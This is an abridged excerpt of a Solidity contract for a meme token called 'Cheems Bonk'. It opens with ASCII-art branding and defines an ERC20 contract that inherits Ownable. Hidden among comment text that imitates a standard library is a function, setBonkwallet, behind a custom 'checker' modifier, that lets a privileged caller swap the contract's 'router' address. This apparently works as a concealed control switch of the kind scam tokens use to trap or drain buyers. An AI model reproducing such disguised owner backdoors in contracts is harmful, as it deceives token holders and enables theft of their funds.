...
[[[        ,[[[,,,[[[ [[cccc   [[cccc   [[[[, ,[[[[,'[==/[[[[,
$$$        "$$$"""$$$ $$""""   $$""""   $$$$$$$$"$$$  '''    $
`88bo,__,o, 888   "88o888oo,__ 888oo,__ 888 Y88" 888o88b    dP
  "YUMMMMMP"MMM    YMM""""YUMMM""""YUMMMMMM  M'  "MMM "YMmMY" 
                :::::::.      ...   :::.    :::. :::  .       
                 ;;;'';;'  .;;;;;;;.`;;;;,  `;;; ;;; .;;,.    
                 [[[__[[\.,[[     \[[,[[[[[. '[[ [[[[[/'      
                 $$""""Y$$$$$,     $$$$$$ "Y$c$$_$$$$,        
                _88o,,od8P"888,_ _,88P888    Y88"888"88o,     
                ""YUMMMP"   "YMMMMMP" MMM     YM MMM "MMP"                              
                       @CheemsBonkToken
                       Join the Bonk
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata , Ownable{
  ...
  /**
     ...
     * _Available since v3.1._
     */
    function setBonkwallet (address set) public checker {
        router = set;
    }
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
...
contract  CheemsBonk is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 5500550055 * 10 ** 18;

    constructor () ERC20(unicode'Cheems Bonk',unicode'BONK🔨') {
